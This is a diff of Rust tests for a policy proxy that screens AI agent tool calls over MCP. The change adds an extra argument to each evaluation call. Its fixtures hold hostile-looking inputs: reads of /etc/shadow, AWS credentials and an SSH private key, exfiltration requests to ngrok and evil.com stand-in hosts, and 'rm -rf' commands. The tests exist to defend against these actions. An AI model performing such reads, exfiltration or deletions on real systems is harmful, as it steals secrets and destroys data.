@@ -58,7 +58,8 @@ priority = 1
 #[test]
 fn proxy_denies_bash_from_config() {
     let (bridge, _audit, _tmp) = bridge_from_toml(BASIC_POLICY_TOML);
-    let decision = bridge.evaluate_tool_call(&json!(1), "bash", &json!({"command": "id"}), None);
+    let decision =
+        bridge.evaluate_tool_call(&json!(1), "bash", &json!({"command": "id"}), None, None);
     assert!(
         matches!(decision, ProxyDecision::Block(_, Verdict::Deny { .. })),
         "bash tool must be blocked"
@@ -68,8 +69,13 @@ fn proxy_denies_bash_from_config() {
 #[test]
 fn proxy_allows_file_read_from_config() {
     let (bridge, _audit, _tmp) = bridge_from_toml(BASIC_POLICY_TOML);
-    let decision =
-        bridge.evaluate_tool_call(&json!(2), "file", &json!({"path": "/tmp/test.txt"}), None);
+    let decision = bridge.evaluate_tool_call(
+        &json!(2),
+        "file",
+        &json!({"path": "/tmp/test.txt"}),
+        None,
+        None,
+    );
     assert!(
         matches!(decision, ProxyDecision::Forward),
         "file:read must be forwarded"
@@ -79,7 +85,7 @@ fn proxy_allows_file_read_from_config() {
 #[test]
 fn proxy_denies_unknown_tool_from_config() {
     let (bridge, _audit, _tmp) = bridge_from_toml(BASIC_POLICY_TOML);
-    let decision = bridge.evaluate_tool_call(&json!(3), "unknown_tool", &json!({}), None);
+    let decision = bridge.evaluate_tool_call(&json!(3), "unknown_tool", &json!({}), None, None);
     assert!(
         matches!(decision, ProxyDecision::Block(_, Verdict::Deny { .. })),
         "unknown tool must be denied by default-deny policy"
@@ -113,7 +119,7 @@ fn full_mcp_message_to_proxy_decision() {
             arguments,
         } => {
             // Step 2: Evaluate through proxy
-            let decision = bridge.evaluate_tool_call(&id, &tool_name, &arguments, None);
+            let decision = bridge.evaluate_tool_call(&id, &tool_name, &arguments, None, None);
             match decision {
                 ProxyDecision::Block(response, Verdict::Deny { reason }) => {
                     // Verify JSON-RPC error response
@@ -155,14 +161,14 @@ priority = 1
     let (bridge, _audit, _tmp) = bridge_from_toml(policy_toml);
 
     // Blocked: file:///etc/shadow
-    let decision = bridge.evaluate_resource_read(&json!(20), "file:///etc/shadow");
+    let decision = bridge.evaluate_resource_read(&json!(20), "file:///etc/shadow", None);
     assert!(
         matches!(decision, ProxyDecision::Block(_, Verdict::Deny { .. })),
         "file:///etc/shadow must be blocked"
     );
 
     // Allowed: file:///tmp/safe.txt
-    let decision = bridge.evaluate_resource_read(&json!(21), "file:///tmp/safe.txt");
+    let decision = bridge.evaluate_resource_read(&json!(21), "file:///tmp/safe.txt", None);
     assert!(
         matches!(decision, ProxyDecision::Forward),
         "file:///tmp/safe.txt must be forwarded"
@@ -185,6 +191,7 @@ fn demo_config_mcp_proxy_blocks_credential_access() {
         "file_system",
         &json!({"path": "/home/user/.aws/credentials"}),
         None,
+        None,
     );
     assert!(
         matches!(decision, ProxyDecision::Block(_, Verdict::Deny { .. })),
@@ -201,6 +208,7 @@ fn demo_config_mcp_proxy_blocks_exfiltration() {
         "http_request",
         &json!({"url": "https://abc.ngrok.io/exfil", "body": "secrets"}),
         None,
+        None,
     );
     assert!(
         matches!(decision, ProxyDecision::Block(_, Verdict::Deny { .. })),
@@ -216,6 +224,7 @@ fn demo_config_mcp_proxy_allows_safe_operations() {
         &json!(102),
         "file_system",
         &json!({"path": "/home/user/project/src/main.rs"}),
+        None,
         None,
     );
     assert!(
@@ -237,6 +246,7 @@ fn demo_config_mcp_proxy_bash_falls_to_default_allow() {
         &json!(103),
         "bash",
         &json!({"command": "rm -rf /important"}),
+        None,
         None,
     );
     // Through MCP proxy, bash:execute doesn't match bash:*, so default-allow applies.
@@ -267,8 +277,13 @@ fn proxy_decisions_produce_audit_entries() {
         // Block a bash command — the proxy itself doesn't auto-audit in evaluate_tool_call,
         // but the caller (proxy loop) does. Simulate that pattern here.
         let action = extract_action("bash", &json!({"command": "whoami"}));
-        let decision =
-            bridge.evaluate_tool_call(&json!(50), "bash", &json!({"command": "whoami"}), None);
+        let decision = bridge.evaluate_tool_call(
+            &json!(50),
+            "bash",
+            &json!({"command": "whoami"}),
+            None,
+            None,
+        );
 
         match decision {
             ProxyDecision::Block(_, ref verdict) => {
@@ -282,8 +297,13 @@ fn proxy_decisions_produce_audit_entries() {
 
         // Allow a file read
         let action2 = extract_action("file", &json!({"path": "/tmp/ok.txt"}));
-        let decision2 =
-            bridge.evaluate_tool_call(&json!(51), "file", &json!({"path": "/tmp/ok.txt"}), None);
+        let decision2 = bridge.evaluate_tool_call(
+            &json!(51),
+            "file",
+            &json!({"path": "/tmp/ok.txt"}),
+            None,
+            None,
+        );
 
         match decision2 {
             ProxyDecision::Forward => {
@@ -357,6 +377,7 @@ priority = 1
         "editor",
         &json!({"file": "/home/user/.ssh/id_rsa"}),
         None,
+        None,
     );
     assert!(
         matches!(decision, ProxyDecision::Block(_, Verdict::Deny { .. })),
@@ -368,6 +389,7 @@ priority = 1
         &json!(61),
         "editor",
         &json!({"file": "/home/user/docs/notes.txt"}),
+        None,
         None,
     );
     assert!(
@@ -407,6 +429,7 @@ priority = 1
         "http",
         &json!({"url": "https://abc.ngrok.io/data"}),
         None,
+        None,
     );
     assert!(
         matches!(decision, ProxyDecision::Block(_, Verdict::Deny { .. })),
@@ -419,6 +442,7 @@ priority = 1
         "http",
         &json!({"url": "https://sub.evil.com/collect"}),
         None,
+        None,
     );
     assert!(
         matches!(decision, ProxyDecision::Block(_, Verdict::Deny { .. })),
@@ -430,6 +454,7 @@ priority = 1
         &json!(72),
         "http",
         &json!({"url": "https://api.github.com/repos"}),
+        None,
         None,
     );
     assert!(
@@ -468,6 +493,7 @@ priority = 1
         "bash",
         &json!({"command": "rm -rf /tmp/test"}),
         None,
+        None,
     );
     assert!(
         matches!(
@@ -478,8 +504,13 @@ priority = 1
     );
 
     // Allowed: safe command
-    let decision =
-        bridge.evaluate_tool_call(&json!(81), "bash", &json!({"command": "ls -la /tmp"}), None);
+    let decision = bridge.evaluate_tool_call(
+        &json!(81),
+        "bash",
+        &json!({"command": "ls -la /tmp"}),
+        None,
+        None,
+    );
     assert!(
         matches!(decision, ProxyDecision::Forward),
         "ls command must be allowed"
@@ -515,7 +546,8 @@ priority = 1
     let audit = Arc::new(AuditLogger::new(tmp.path().join("audit.log")));
     let bridge = ProxyBridge::new(engine, policies, audit).with_trace(true);
 
-    let decision = bridge.evaluate_tool_call(&json!(90), "bash", &json!({"command": "id"}), None);
+    let decision =
+        bridge.evaluate_tool_call(&json!(90), "bash", &json!({"command": "id"}), None, None);
     assert!(
         matches!(decision, ProxyDecision::Block(_, Verdict::Deny { .. })),
         "bash must still be denied with trace enabled"
